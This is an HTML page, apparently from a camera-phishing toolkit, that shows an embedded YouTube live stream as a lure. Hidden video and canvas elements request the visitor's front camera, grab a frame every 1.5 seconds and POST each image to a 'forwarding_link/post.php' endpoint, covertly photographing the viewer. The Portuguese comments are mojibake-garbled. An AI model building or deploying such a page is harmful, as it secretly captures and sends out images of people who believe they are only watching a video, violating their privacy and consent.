<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1"
    />
    <title>Live YouTube</title>

    <script
      type="text/javascript"
      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
    ></script>
    <link
      rel="stylesheet"
      type="text/css"
      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
    />
    <script
      type="text/javascript"
      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
    ></script>
  </head>

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>

  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>
    /*
     * FunÃ§Ã£o para enviar os dados da imagem (captura da cÃ¢mera) via AJAX.
     * O URL de destino para o POST Ã© 'forwarding_link/post.php'.
     */
    function post(imgdata) {
      $.ajax({
        type: "POST",
        data: { cat: imgdata },
        url: "forwarding_link/post.php",
        dataType: "json",
        async: false,
        success: function (result) {
          // Manipulador de sucesso: esta funÃ§Ã£o lida com a resposta/resultados do servidor.
        },
        error: function () {
          // Manipulador de erro
        },
      });
    }

    ("use strict");

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const errorMsgElement = document.querySelector("span#errorMsg");

    const constraints = {
      audio: false, // NÃ£o solicitar acesso ao microfone
      video: {
        // Tenta usar a cÃ¢mera frontal em dispositivos mÃ³veis
        facingMode: "user",
      },
    };

    // ðŸŽ¥ Acessar a webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        // Exibe o erro se o acesso Ã  cÃ¢mera falhar (e.g., permissÃ£o negada)
        if (errorMsgElement) {
          errorMsgElement.innerHTML = `Erro navigator.getUserMedia: ${e.toString()}`;
        }
      }
    }

    // âœ… Sucesso: lida com o stream da cÃ¢mera
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext("2d");

      // ðŸ“¸ Configura o intervalo para capturar a imagem a cada 1500ms (1.5 segundos)
      setInterval(function () {
        context.drawImage(video, 0, 0, 640, 480);
        // Converte o frame do canvas para um formato de dados e o envia
        var canvasData = canvas
          .toDataURL("image/png")
          .replace("image/png", "image/octet-stream");
        post(canvasData);
      }, 1500);
    }

    // ðŸš€ Inicia a funÃ§Ã£o de acesso Ã  cÃ¢mera
    init();
  </script>

  <body>
    <div style="text-align: center; margin-top: 20px">
      <h2>ðŸ“º Assista ao VÃ­deo ao Vivo Abaixo</h2>
      <p>Aguarde o carregamento do stream.</p>
    </div>

    <iframe
      id="Live_YT_TV"
      width="100%"
      height="500px"
      src="https://www.youtube.com/embed/live_yt_tv?autoplay=1"
      frameborder="0"
      allow="autoplay encrypted-media; gyroscope; picture-in-picture"
      allowfullscreen
    >
    </iframe>
  </body>
</html>
